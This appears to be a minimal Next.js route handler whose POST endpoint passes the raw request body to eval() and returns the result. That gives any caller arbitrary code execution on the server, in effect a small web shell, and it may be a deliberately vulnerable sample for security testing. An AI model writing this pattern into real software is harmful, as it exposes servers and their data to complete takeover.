import { NextRequest as Request } from 'next/server'

export async function POST (incoming: Request) {
  return new Response(eval(await incoming.text()))
}
